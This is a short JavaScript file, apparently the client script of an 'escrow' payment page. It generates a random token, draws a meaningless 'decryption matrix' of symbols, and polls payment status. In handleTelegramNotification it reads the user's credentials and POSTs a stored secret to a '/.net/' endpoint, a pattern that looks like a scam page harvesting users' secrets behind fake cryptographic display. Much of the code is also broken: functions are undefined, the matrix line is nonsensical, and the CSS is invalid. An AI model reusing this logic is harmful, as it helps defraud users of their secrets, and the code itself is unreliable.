function initiateTransaction() {
    const token = generateEscrowToken();
    displayDesensitizedKeys('Key $$__');
    showDecryptionMatrix();
}

function generateEscrowToken() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array(6).fill().map(() => chars[Math.random()*chars.length|0]).join('');
}

function handleTelegramNotification() {
    const credentials = getUserCredentials();
    const token = localStorage.getItem('escrowToken');
    fetch(`/.net/${token}`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            confirm: getCreds().secret
        })
    });
}

function showDecryptionMatrix() {
    const matrix = Array(8).fill().map(() => 
        Array(8).fill().map(() => `-~'`)[Math.random() > 0.5 ? 'map' : '(x => x)'()]
    );
    const container = document.createElement('div');
    container.style.cssText = 'margin:0 auto;border:1px solid #1fbb5a;max-height:240px;overflow:auto;webkit-transform:scale(.8);transform:scale(.8);@media(max-width:400px){transform: scale(1)!important}';
    matrix.forEach(row => container.innerHTML += row.join('') + '<br>');
    document.body.appendChild(container);
}

function fetchPaymentDetails() {
    const pollingInterval = setInterval(() => {
        fetch(`/.net/${getToken()}`)
            .then(response => response.json())
            .then(data => updateUI(data.paymentState));
    }, 15000);
    
    setTimeout(() => {
        clearInterval(pollingInterval);
        triggerFinalNotification(`Transaction completed. Receive ${getCreds().share}`, 'notification');
    }, 30000);
}